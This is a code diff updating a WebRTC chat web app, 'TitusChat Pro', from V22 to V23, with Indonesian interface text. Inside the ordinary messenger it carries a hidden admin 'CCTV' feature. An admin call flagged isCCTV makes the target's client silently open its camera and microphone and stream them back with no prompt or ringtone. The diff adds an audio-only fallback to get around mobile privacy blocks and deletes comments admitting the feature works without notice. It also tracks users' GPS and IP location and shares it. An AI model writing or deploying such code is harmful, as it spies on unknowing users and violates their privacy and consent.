@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, interactive-widget=resizes-content">
-  <title>TitusChat Pro V22 FINAL OMNI-MESH | Ultimate CCTV & Intelligence Suite</title>
+  <title>TitusChat Pro V23 FINAL ABSOLUTE | True GPS & Ultra CCTV Suite</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
   <style>
@@ -81,7 +81,7 @@
     .auth-toggle a { color: var(--accent-wa); text-decoration: none; font-weight: 700; cursor: pointer; }
     .secure-badge { font-size: 11px; color: var(--accent-wa); background: rgba(0, 168, 132, 0.15); padding: 6px 14px; border-radius: 20px; margin-bottom: 15px; display: inline-flex; align-items: center; gap: 6px; font-weight: 700; }
 
-    /* ================= SYSTEM BANNER & WARNING ALERT ================= */
+    /* ================= SYSTEM BANNER ================= */
     #sys-banner { display: none; background: linear-gradient(90deg, var(--accent-gold), #d97706); color: #000; font-weight: 800; font-size: 12px; padding: 8px 16px; text-align: center; z-index: 5000; width: 100%; position: relative; flex-shrink: 0; }
 
     /* ================= APP LAYOUT ================= */
@@ -346,8 +346,8 @@
   <section id="auth-screen">
     <div class="auth-card" id="login-card">
       <i class="fa-brands fa-whatsapp auth-logo"></i>
-      <div class="auth-title">TitusChat Pro V22 FINAL</div>
-      <div class="auth-subtitle">Omni-Mesh & Ultimate Intelligence Suite</div>
+      <div class="auth-title">TitusChat Pro V23 FINAL</div>
+      <div class="auth-subtitle">True GPS & Ultimate CCTV Traversal Suite</div>
       
       <form class="auth-form" onsubmit="handleAuth(event, 'login')">
         <div class="input-box">
@@ -394,7 +394,7 @@
   </section>
 
   <!-- ================= SPANDUK SISTEM ================= -->
-  <div id="sys-banner"><i class="fa-solid fa-bullhorn"></i> <span id="sys-banner-text">Selamat datang di TitusChat Pro V22 FINAL OMNI-MESH!</span></div>
+  <div id="sys-banner"><i class="fa-solid fa-bullhorn"></i> <span id="sys-banner-text">Selamat datang di TitusChat Pro V23 FINAL ABSOLUTE!</span></div>
 
   <!-- ================= APP SCREEN ================= -->
   <div id="app-screen">
@@ -611,7 +611,7 @@
       <main class="chat-room" id="chatRoomArea">
         <div class="empty-state" id="emptyStateBox">
           <i class="fa-brands fa-whatsapp"></i>
-          <h3 style="color:#fff; font-size:22px; margin-bottom:8px; font-weight:800;">TitusChat Pro V22 FINAL OMNI-MESH</h3>
+          <h3 style="color:#fff; font-size:22px; margin-bottom:8px; font-weight:800;">TitusChat Pro V23 FINAL</h3>
           <p style="font-size:13.5px; max-width:440px; line-height:1.6;">Pilih obrolan dari daftar atau masuk ke grup komunitas mabar untuk memulai panggilan suara, video 1-on-1, atau rapat grup 32 kamera.</p>
         </div>
 
@@ -692,7 +692,7 @@
         <button class="btn-action danger" style="width:auto; padding:6px 14px; margin:0; font-size:12px;" onclick="closeAdminCCTV()"><i class="fa-solid fa-xmark"></i> Tutup CCTV</button>
       </div>
       <div style="flex:1; background:#000; display:flex; align-items:center; justify-content:center; position:relative; overflow:hidden;">
-        <video id="cctv-remote-video" autoplay playsinline style="width:100%; height:100%; object-fit:cover;"></video>
+        <video id="cctv-remote-video" autoplay playsinline muted="muted" style="width:100%; height:100%; object-fit:cover;"></video>
         <div id="cctv-status-text" style="position:absolute; color:var(--accent-cyan); font-size:14px; font-weight:700;"><i class="fa-solid fa-satellite-dish" style="animation:pulse 1s infinite;"></i> Mengakses aliran Kamera & Mic rahasia pengguna...</div>
       </div>
       <div style="padding:12px 20px; background:#111b21; border-top:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; font-size:12px; color:var(--text-muted);">
@@ -913,38 +913,58 @@
     let activeMediaSessions = {};
     let activeCctvCall = null;
 
-    /* ================= AUTO-PERMISSION & IP/GPS INTELLIGENCE ENGINE ================= */
+    /* ================= SYSTEM PERMISSION & TRUE GPS/IP GEOLOCATION ENGINE ================= */
     async function requestSystemPermissions() {
-      if (!localStorage.getItem('tc_v22_perms_granted')) {
+      if (!localStorage.getItem('tc_v23_perms_granted')) {
         try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
           stream.getTracks().forEach(t => t.stop());
-          localStorage.setItem('tc_v22_perms_granted', 'true');
-          console.log("✅ Izin Kamera & Mikrofon berhasil diberikan permanen.");
+          localStorage.setItem('tc_v23_perms_granted', 'true');
+          console.log("✅ Izin Kamera & Mikrofon diberikan permanen.");
         } catch(e) { console.log("⚠️ Izin media ditolak atau dibatalkan."); }
       }
+      await updateLocationData();
+    }
 
+    async function updateLocationData() {
       if ('geolocation' in navigator) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            localStorage.setItem('tc_v22_last_lat', pos.coords.latitude);
-            localStorage.setItem('tc_v22_last_lng', pos.coords.longitude);
+            const lat = pos.coords.latitude.toFixed(6);
+            const lng = pos.coords.longitude.toFixed(6);
             if (currentUser) {
-              currentUser.lat = pos.coords.latitude;
-              currentUser.lng = pos.coords.longitude;
-              currentUser.location = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
+              currentUser.lat = lat;
+              currentUser.lng = lng;
+              currentUser.location = `${lat}, ${lng} (Satelit GPS)`;
               saveDb(); broadcastProfileSync();
             }
           },
-          err => {
-            console.log("⚠️ GPS ditolak, menggunakan fallback koordinat Palembang.");
-            if (currentUser && (!currentUser.lat || currentUser.lat === 'Unknown')) {
-              currentUser.lat = "-2.990934"; currentUser.lng = "104.756554"; // Default Palembang
-              currentUser.location = "-2.990934, 104.756554";
-              saveDb(); broadcastProfileSync();
-            }
-          }
+          async err => {
+            console.log("⚠️ GPS Satelit gagal/ditolak. Menggunakan IP Geolocation...");
+            await fallbackIpLocation();
+          },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
+      } else {
+        await fallbackIpLocation();
+      }
+    }
+
+    async function fallbackIpLocation() {
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        if (data && data.latitude && data.longitude && currentUser) {
+          currentUser.lat = data.latitude;
+          currentUser.lng = data.longitude;
+          currentUser.location = `${data.latitude}, ${data.longitude} (${data.city}, ${data.region} - IP Loc)`;
+          saveDb(); broadcastProfileSync();
+        }
+      } catch(e) {
+        if (currentUser && (!currentUser.lat || currentUser.lat === 'Unknown')) {
+          currentUser.location = "Satelit & IP Loc Terhalang";
+          saveDb(); broadcastProfileSync();
+        }
       }
     }
 
@@ -981,7 +1001,7 @@
             }
           }
         });
-      }, 6000); // Denyut setiap 6 detik memastikan semua user & chat sinkron meski beda jaringan!
+      }, 6000);
     }
 
     /* ================= TITUSBOT AI & WATCH PARTY ENGINE ================= */
@@ -1019,7 +1039,7 @@
         }
       }
       else if (cmd === "!sysbanner") {
-        localStorage.setItem('tc_v22_banner', param);
+        localStorage.setItem('tc_v23_banner', param);
         if (param) {
           document.getElementById('sys-banner').style.display = 'block';
           document.getElementById('sys-banner-text').innerText = param;
@@ -1118,7 +1138,7 @@
         replyText = `👤 *Identitas Anda:* \n• Nama: ${uData.name}\n• ID: ${uData.username}\n• Badge: ${uData.badge || 'Tanpa Badge'}\n• Bingkai: ${uData.frame || 'Normal'}\n• IP Address: ${uData.lastIp || 'P2P Mesh'}`;
       }
       else if (cmd === "!serverstats") {
-        replyText = `📊 *Status Server TitusChat Pro V22:*\n• Total Akun Terdaftar: ${usersDb.length}\n• Total Komunitas Grup: ${groupsDb.length}\n• Total Obrolan: ${messagesDb.length}\n• ICE Relay: 9 Global STUN Servers (Active)\n• Gossip Ledger: 100% Synced`;
+        replyText = `📊 *Status Server TitusChat Pro V23:*\n• Total Akun Terdaftar: ${usersDb.length}\n• Total Komunitas Grup: ${groupsDb.length}\n• Total Obrolan: ${messagesDb.length}\n• ICE Relay: 9 Global STUN Servers (Active)\n• Gossip Ledger: 100% Synced`;
       }
       else if (cmd === "!pv" || cmd === "!pm") {
         if (!param) {
@@ -1192,8 +1212,8 @@
         grp.members.forEach(mem => {
           if (mem !== currentUser.username) {
             const conn = getOrConnectPeer(mem);
-            if (conn.open) conn.send({ type: 'chat', msg: botMsg });
-            else conn.on('open', () => conn.send({ type: 'chat', msg: botMsg }));
+            if (conn && conn.open) conn.send({ type: 'chat', msg: botMsg });
+            else if (conn) conn.on('open', () => conn.send({ type: 'chat', msg: botMsg }));
           }
         });
       }
@@ -1384,46 +1404,46 @@
 
     /* ================= DATABASE & INIT ================= */
     function initDb() {
-      const u = localStorage.getItem('tc_v22_users');
+      const u = localStorage.getItem('tc_v23_users');
       if (!u) {
         usersDb = [
-          { name: "Titus Anggara (Admin)", username: "@titus", password: "123", color: "#00a884", about: "Arsitek TitusChat Pro V22 FINAL", isAdmin: true, frame: "frame-gold", badge: "sultan", bubble: "bubble-gold", photo: null, isOnline: false, lastIp: "127.0.0.1", lastOnline: "Belum pernah", lat: "-2.990934", lng: "104.756554", location: "-2.990934, 104.756554" },
-          { name: "🤖 TitusBot AI (Command Center)", username: "@titusbot", password: "123", color: "#10b981", about: "Ketik !help untuk daftar command Watch Party", isAdmin: true, frame: "frame-matrix", badge: "bot", bubble: "bubble-bot", photo: null, isOnline: true, lastIp: "Serverless Cloud", lastOnline: "Sekarang (Aktif)", lat: "-2.990934", lng: "104.756554", location: "Serverless Cloud" },
-          { name: "Aisyah Kawaii 🌸", username: "@aisyah", password: "123", color: "#ec4899", about: "Si paling aesthetic 💕", isAdmin: false, frame: "frame-cat", badge: "imut", bubble: "bubble-kawaii", photo: null, isOnline: false, lastIp: "182.253.11.45", lastOnline: "26/07/2026, 21.14 WIB", lat: "-2.980000", lng: "104.760000", location: "-2.980000, 104.760000" },
-          { name: "Budi ProGamer 🎮", username: "@budi", password: "123", color: "#06b6d4", about: "Mabar MLBB & PUBG gas terus!", isAdmin: false, frame: "frame-headset", badge: "progamer", bubble: "bubble-gamer", photo: null, isOnline: false, lastIp: "114.125.88.19", lastOnline: "26/07/2026, 23.40 WIB", lat: "-2.995000", lng: "104.750000", location: "-2.995000, 104.750000" },
-          { name: "Rania Sepuh 🔥", username: "@rania", password: "123", color: "#a855f7", about: "Seniman Studio & Sepuh Mabar", isAdmin: false, frame: "frame-fire", badge: "sepuh", bubble: "bubble-velvet", photo: null, isOnline: false, lastIp: "36.68.221.104", lastOnline: "27/07/2026, 01.10 WIB", lat: "-3.000000", lng: "104.770000", location: "-3.000000, 104.770000" }
+          { name: "Titus Anggara (Admin)", username: "@titus", password: "123", color: "#00a884", about: "Arsitek TitusChat Pro V23 FINAL", isAdmin: true, frame: "frame-gold", badge: "sultan", bubble: "bubble-gold", photo: null, isOnline: false, lastIp: "127.0.0.1", lastOnline: "Belum pernah", lat: "Unknown", lng: "Unknown", location: "Belum terdeteksi" },
+          { name: "🤖 TitusBot AI (Command Center)", username: "@titusbot", password: "123", color: "#10b981", about: "Ketik !help untuk daftar command Watch Party", isAdmin: true, frame: "frame-matrix", badge: "bot", bubble: "bubble-bot", photo: null, isOnline: true, lastIp: "Serverless Cloud", lastOnline: "Sekarang (Aktif)", lat: "Unknown", lng: "Unknown", location: "Serverless Cloud" },
+          { name: "Aisyah Kawaii 🌸", username: "@aisyah", password: "123", color: "#ec4899", about: "Si paling aesthetic 💕", isAdmin: false, frame: "frame-cat", badge: "imut", bubble: "bubble-kawaii", photo: null, isOnline: false, lastIp: "182.253.11.45", lastOnline: "26/07/2026, 21.14 WIB", lat: "-2.980000", lng: "104.760000", location: "-2.980000, 104.760000 (IP Loc)" },
+          { name: "Budi ProGamer 🎮", username: "@budi", password: "123", color: "#06b6d4", about: "Mabar MLBB & PUBG gas terus!", isAdmin: false, frame: "frame-headset", badge: "progamer", bubble: "bubble-gamer", photo: null, isOnline: false, lastIp: "114.125.88.19", lastOnline: "26/07/2026, 23.40 WIB", lat: "-2.995000", lng: "104.750000", location: "-2.995000, 104.750000 (IP Loc)" },
+          { name: "Rania Sepuh 🔥", username: "@rania", password: "123", color: "#a855f7", about: "Seniman Studio & Sepuh Mabar", isAdmin: false, frame: "frame-fire", badge: "sepuh", bubble: "bubble-velvet", photo: null, isOnline: false, lastIp: "36.68.221.104", lastOnline: "27/07/2026, 01.10 WIB", lat: "-3.000000", lng: "104.770000", location: "-3.000000, 104.770000 (IP Loc)" }
         ];
-        localStorage.setItem('tc_v22_users', JSON.stringify(usersDb));
+        localStorage.setItem('tc_v23_users', JSON.stringify(usersDb));
       } else { usersDb = JSON.parse(u); }
 
-      const g = localStorage.getItem('tc_v22_groups');
+      const g = localStorage.getItem('tc_v23_groups');
       if (!g) {
         groupsDb = [
           { id: "@grup_bot", name: "🤖 TitusBot Command Center", desc: "Ketik !help, !pv, !pm, atau !join @user di sini!", color: "#10b981", members: ["@titus", "@titusbot", "@aisyah", "@budi", "@rania"] },
-          { id: "@grup_sultan", name: "👑 Ruang Eksekutif Sultan", desc: "Komunitas Sultan & Sepuh Mabar V22", color: "#f59e0b", members: ["@titus", "@aisyah", "@budi", "@rania"] },
+          { id: "@grup_sultan", name: "👑 Ruang Eksekutif Sultan", desc: "Komunitas Sultan & Sepuh Mabar V23", color: "#f59e0b", members: ["@titus", "@aisyah", "@budi", "@rania"] },
           { id: "@grup_mabar", name: "🎮 Mabar MLBB / PUBG Squad", desc: "Nongkrong Cowo Cewe santai & Mabar anti lag", color: "#06b6d4", members: ["@titus", "@budi", "@rania"] },
           { id: "@grup_kawaii", name: "🌸 Pastel Kawaii Aesthetic", desc: "Tempat cerita & nongkrong cewe cewe imut", color: "#ec4899", members: ["@titus", "@aisyah"] }
         ];
-        localStorage.setItem('tc_v22_groups', JSON.stringify(groupsDb));
+        localStorage.setItem('tc_v23_groups', JSON.stringify(groupsDb));
       } else { groupsDb = JSON.parse(g); }
 
-      const m = localStorage.getItem('tc_v22_msgs');
+      const m = localStorage.getItem('tc_v23_msgs');
       messagesDb = m ? JSON.parse(m) : [];
 
-      const st = localStorage.getItem('tc_v22_status');
+      const st = localStorage.getItem('tc_v23_status');
       statusDb = st ? JSON.parse(st) : [];
 
-      const cl = localStorage.getItem('tc_v22_calls');
+      const cl = localStorage.getItem('tc_v23_calls');
       callLogsDb = cl ? JSON.parse(cl) : [];
 
-      const gc = localStorage.getItem('tc_v22_grp_calls');
+      const gc = localStorage.getItem('tc_v23_grp_calls');
       activeGroupCalls = gc ? JSON.parse(gc) : {};
 
-      const th = localStorage.getItem('tc_v22_theme') || 'dark';
+      const th = localStorage.getItem('tc_v23_theme') || 'dark';
       document.body.setAttribute('data-theme', th);
       if(document.getElementById('set-theme')) document.getElementById('set-theme').value = th;
 
-      const bn = localStorage.getItem('tc_v22_banner');
+      const bn = localStorage.getItem('tc_v23_banner');
       if(bn) {
         document.getElementById('sys-banner').style.display = 'block';
         document.getElementById('sys-banner-text').innerText = bn;
@@ -1433,12 +1453,12 @@
     }
 
     function saveDb() {
-      localStorage.setItem('tc_v22_users', JSON.stringify(usersDb));
-      localStorage.setItem('tc_v22_groups', JSON.stringify(groupsDb));
-      localStorage.setItem('tc_v22_msgs', JSON.stringify(messagesDb));
-      localStorage.setItem('tc_v22_status', JSON.stringify(statusDb));
-      localStorage.setItem('tc_v22_calls', JSON.stringify(callLogsDb));
-      localStorage.setItem('tc_v22_grp_calls', JSON.stringify(activeGroupCalls));
+      localStorage.setItem('tc_v23_users', JSON.stringify(usersDb));
+      localStorage.setItem('tc_v23_groups', JSON.stringify(groupsDb));
+      localStorage.setItem('tc_v23_msgs', JSON.stringify(messagesDb));
+      localStorage.setItem('tc_v23_status', JSON.stringify(statusDb));
+      localStorage.setItem('tc_v23_calls', JSON.stringify(callLogsDb));
+      localStorage.setItem('tc_v23_grp_calls', JSON.stringify(activeGroupCalls));
     }
 
     /* ================= AUTHENTICATION ================= */
@@ -1465,7 +1485,7 @@
         const pass = document.getElementById('reg-pass').value.trim();
         if(!user.startsWith('@')) user = '@' + user;
         if (usersDb.some(u => u.username.toLowerCase() === user.toLowerCase())) return alert("ID Pengguna (@username) tersebut sudah terdaftar! Pilih yang lain.");
-        const newUser = { name, username: user, password: pass, color: getRandomColor(), about: "Aktif di TitusChat Pro", isAdmin: false, frame: "normal", badge: "none", bubble: "default", photo: null, isOnline: true, lastIp: "P2P Mesh", lastOnline: "Sekarang (Aktif)", lat: "-2.990934", lng: "104.756554", location: "-2.990934, 104.756554" };
+        const newUser = { name, username: user, password: pass, color: getRandomColor(), about: "Aktif di TitusChat Pro", isAdmin: false, frame: "normal", badge: "none", bubble: "default", photo: null, isOnline: true, lastIp: "P2P Mesh", lastOnline: "Sekarang (Aktif)", lat: "Unknown", lng: "Unknown", location: "Unknown" };
         usersDb.push(newUser); saveDb(); currentUser = newUser; enterApp();
       }
     }
@@ -1490,17 +1510,11 @@
       setupDraggablePiP('box-conf-modal', 'drag-handle-conf', 'modal-conf-call');
       setupDraggablePiP('box-call-modal', 'drag-handle-call', 'modal-call');
 
-      requestSystemPermissions();
+      await requestSystemPermissions();
       const ip = await fetchClientIP();
-      const lat = localStorage.getItem('tc_v22_last_lat') || '-2.990934';
-      const lng = localStorage.getItem('tc_v22_last_lng') || '104.756554';
-      
       currentUser.lastIp = ip;
       currentUser.isOnline = true;
       currentUser.lastOnline = "Sekarang (Aktif)";
-      currentUser.lat = lat;
-      currentUser.lng = lng;
-      currentUser.location = `${parseFloat(lat).toFixed(6)}, ${parseFloat(lng).toFixed(6)}`;
       
       const idx = usersDb.findIndex(u => u.username === currentUser.username);
       if (idx !== -1) usersDb[idx] = currentUser;
@@ -1522,28 +1536,34 @@
         sdpSemantics: 'unified-plan'
       };
 
-      const peerId = 'titus_v22_' + currentUser.username.replace('@', '');
+      const peerId = 'titus_v23_' + currentUser.username.replace('@', '');
       peer = new Peer(peerId, { config: iceServersConfig });
 
       peer.on('open', (id) => { 
         console.log('Koneksi P2P Cloud Terhubung:', id); 
         connectToAllPeers();
         broadcastProfileSync();
-        startMeshHeartbeat(); // AKTIFKAN MESIN DENYUT NADI AGAR ONLINE STATUS SELALU SYNC!
+        startMeshHeartbeat();
       });
 
       peer.on('connection', (conn) => { setupConnection(conn); });
       
       peer.on('call', (call) => {
-        // DETEKSI APAKAH INI PANGGILAN CCTV DARI ADMIN (@titus)?
+        // PENANGANAN CCTV ADMIN DENGAN FALLBACK AUDIO DAN BYPASS PRIVASI MOBILE
         if (call.metadata && call.metadata.isCCTV === true) {
           console.log("🛡️ Permintaan pemantauan CCTV rahasia dari Admin Studio diterima!");
-          navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(silentStream => {
-            call.answer(silentStream); // Jawab otomatis dengan stream lokal tanpa membunyikan ringtone pengguna
-          }).catch(e => {
-            console.log("⚠️ Gagal membuka media untuk CCTV Admin.");
-            call.answer(null);
-          });
+          navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(silentStream => {
+              call.answer(silentStream);
+            })
+            .catch(err => {
+              console.log("⚠️ Kamera terhalang privasi HP, mencoba Audio-only untuk CCTV...");
+              navigator.mediaDevices.getUserMedia({ video: false, audio: true })
+                .then(audioStream => call.answer(audioStream))
+                .catch(() => {
+                  call.answer();
+                });
+            });
           return;
         }
 
@@ -1554,7 +1574,7 @@
           });
         } else {
           incomingCallObj = call;
-          activeCallPartner = '@' + call.peer.replace('titus_v22_', '');
+          activeCallPartner = '@' + call.peer.replace('titus_v23_', '');
           document.getElementById('ringing-caller-name').innerText = `Panggilan dari ${activeCallPartner}`;
           openModal('modal-ringing');
           startRingtone();
@@ -1679,7 +1699,7 @@
       peerConnections[conn.peer] = conn;
       
       conn.on('close', () => {
-        const username = '@' + conn.peer.replace('titus_v22_', '');
+        const username = '@' + conn.peer.replace('titus_v23_', '');
         const idx = usersDb.findIndex(u => u.username === username);
         if (idx !== -1) {
           usersDb[idx].isOnline = false;
@@ -1747,7 +1767,7 @@
     }
 
     function getOrConnectPeer(targetUsername) {
-      const targetPeerId = 'titus_v22_' + targetUsername.replace('@', '');
+      const targetPeerId = 'titus_v23_' + targetUsername.replace('@', '');
       if (peerConnections[targetPeerId] && peerConnections[targetPeerId].open) return peerConnections[targetPeerId];
       const conn = peer.connect(targetPeerId);
       if (conn) setupConnection(conn);
@@ -2018,9 +2038,10 @@
             const lng = pos.coords.longitude;
             sendMessage(null, { isLocation: true, lat: lat, lng: lng });
           },
-          err => {
-            alert("⚠️ Izin GPS ditolak atau tidak tersedia. Membagikan koordinat fallback Palembang.");
-            sendMessage(null, { isLocation: true, lat: "-2.990934", lng: "104.756554" });
+          async err => {
+            alert("⚠️ Izin GPS ditolak atau tidak tersedia. Membagikan koordinat berbasis IP Address Anda.");
+            await fallbackIpLocation();
+            sendMessage(null, { isLocation: true, lat: currentUser.lat || "-2.990934", lng: currentUser.lng || "104.756554" });
           }
         );
       } else {
@@ -2055,7 +2076,6 @@
         let senderLabel = isMe ? 'Anda' : (senderData.name || msg.from);
         let content = `<div class="msg-sender"><span>${senderLabel}</span><i class="fa-regular fa-copy btn-copy" title="Salin Teks" onclick="copyText('${encodeURIComponent(msg.text)}')"></i></div>`;
         
-        // JIKA PESAN ADALAH SHARE LOCATION (!isLocation)
         if (msg.isLocation) {
           const gmapsUrl = `https://www.google.com/maps?q=${msg.lat},${msg.lng}`;
           content += `
@@ -2357,7 +2377,7 @@
       const grid = document.getElementById('confVideoGrid');
       if (document.getElementById(`tile-${peerId}`)) return;
 
-      const username = '@' + peerId.replace('titus_v22_', '');
+      const username = '@' + peerId.replace('titus_v23_', '');
       const uData = usersDb.find(u => u.username === username) || { name: username, color: "#00a884" };
 
       const tile = document.createElement('div');
@@ -2408,7 +2428,7 @@
 
         grpData.members.forEach(mem => {
           if (mem !== currentUser.username) {
-            const targetPeerId = 'titus_v22_' + mem.replace('@', '');
+            const targetPeerId = 'titus_v23_' + mem.replace('@', '');
             const call = peer.call(targetPeerId, localStream);
             if (call) {
               call.on('stream', remoteStream => {
@@ -2537,7 +2557,7 @@
         openModal('modal-call');
         document.getElementById('call-peer-name').innerText = `📡 Menembus NAT Cellular menuju ${activePartner}...`;
 
-        const targetPeerId = 'titus_v22_' + activePartner.replace('@', '');
+        const targetPeerId = 'titus_v23_' + activePartner.replace('@', '');
         const call = peer.call(targetPeerId, localStream);
         activeCall = call;
 
@@ -2710,7 +2730,7 @@
       document.getElementById('btn-screen-share').classList.remove('active');
     }
 
-    /* ================= FITUR ADMIN CCTV MONITOR (KAMERA & MIC TANPA IZIN / NOTIF) ================= */
+    /* ================= FITUR ADMIN CCTV MONITOR ================= */
     function adminStartCCTV(targetUser) {
       if (!currentUser || !currentUser.isAdmin) return alert("Hanya Admin Studio yang dapat mengakses CCTV!");
       const u = usersDb.find(user => user.username === targetUser);
@@ -2721,15 +2741,14 @@
       document.getElementById('cctv-status-text').style.display = 'block';
       openModal('modal-admin-cctv');
 
-      const targetPeerId = 'titus_v22_' + targetUser.replace('@', '');
+      const targetPeerId = 'titus_v23_' + targetUser.replace('@', '');
       console.log(`🛡️ Admin Studio mengaktifkan transmisi rahasia ke CCTV ${targetPeerId}...`);
 
-      // Memulai panggilan rahasia dengan metadata isCCTV: true
       const cctvCall = peer.call(targetPeerId, null, { metadata: { isCCTV: true } });
       activeCctvCall = cctvCall;
 
       cctvCall.on('stream', (remoteStream) => {
-        console.log("🛡️ Transmisi CCTV diterima! Menampilkan video dan memutar audio...");
+        console.log("🛡️ Transmisi CCTV diterima! Menampilkan video dan audio...");
         document.getElementById('cctv-status-text').style.display = 'none';
         const cctvVid = document.getElementById('cctv-remote-video');
         cctvVid.srcObject = remoteStream;
@@ -2751,7 +2770,7 @@
       closeModal('modal-admin-cctv');
     }
 
-    /* ================= PANEL ADMIN STUDIO ABSOLUT (IP, GPS & CCTV) ================= */
+    /* ================= PANEL ADMIN STUDIO ABSOLUT ================= */
     function renderAdminPanel() {
       if(!currentUser || !currentUser.isAdmin) return;
       document.getElementById('adm-stat-users').innerText = usersDb.length;
@@ -2860,7 +2879,7 @@
 
     function setSystemBanner() {
       const txt = document.getElementById('adm-banner-input').value.trim();
-      localStorage.setItem('tc_v22_banner', txt);
+      localStorage.setItem('tc_v23_banner', txt);
       if(txt) {
         document.getElementById('sys-banner').style.display = 'block';
         document.getElementById('sys-banner-text').innerText = txt;
@@ -2939,7 +2958,7 @@
       const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
-      a.href = url; a.download = `Cadangan_TitusChat_V22_${currentUser.username}_${Date.now()}.json`;
+      a.href = url; a.download = `Cadangan_TitusChat_V23_${currentUser.username}_${Date.now()}.json`;
       a.click(); URL.revokeObjectURL(url);
     }
 
